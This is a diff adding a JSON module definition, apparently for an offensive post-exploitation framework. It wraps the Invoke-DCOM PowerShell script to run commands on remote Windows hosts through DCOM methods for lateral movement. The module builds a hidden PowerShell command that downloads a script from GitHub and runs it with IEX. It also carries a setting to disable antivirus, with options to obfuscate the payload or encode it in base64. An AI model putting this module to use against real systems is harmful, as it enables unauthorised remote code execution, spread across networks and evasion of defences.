@@ -1,0 +1,42 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Invoke-DCOM",
+    "author": ["Steve Borosh (@rvrsh3ll)"],
+    "path": ["windows", "x64", "powershell", "lateral", "dcom", "Invoke-DCOM.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "Execute's commands via various DCOM methods as demonstrated by (@enigma0x3) http://www.enigma0x3.net.\r\nExample: Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\"",
+    "remote": "https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1",
+    "local": ["data", "src", "rvrsh3ll", "Misc-Powershell-Scripts", "Invoke-DCOM.ps1"],
+    "options": [
+      {"name": "ComputerName", "value": "127.0.0.1", "required": true, "flag": "-ComputerName", "description":"IP Address or Hostname of the remote system"},
+      {"name": "Method", "value": "MMC20.Application", "required": true, "flag": "-Method", "description":"Specifies the desired type of execution. Options are MMC20.Application, ExcelDDE, ServiceStart, ShellWindows, ShellBrowserWindow, CheckDomain, MinimizeAll, ServiceStop, ServiceStart, DetectOffice, RegisterXLL"},
+      {"name": "Command", "value": "calc.exe", "required": true, "flag": "-Command", "description":"Specifies the desired command to be executed"},
+      {"name": "ServiceName", "value": null, "required": false, "flag": "-ServiceName", "description":""},
+      {"name": "DLLPath", "value": null, "required": false, "flag": "-DLLPath", "description":""}
+    ],
+    "description": "Invoke commands on remote hosts via MMC20.Application COM object over DCOM.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w", "0",
+      "\"IEX",
+      "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1');",
+      "Invoke-DCOM",
+      "{{ComputerName}}",
+      "{{Method}}",
+      "{{Command}}",
+      "{{DLLPath}}",
+      "{{ServiceName}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
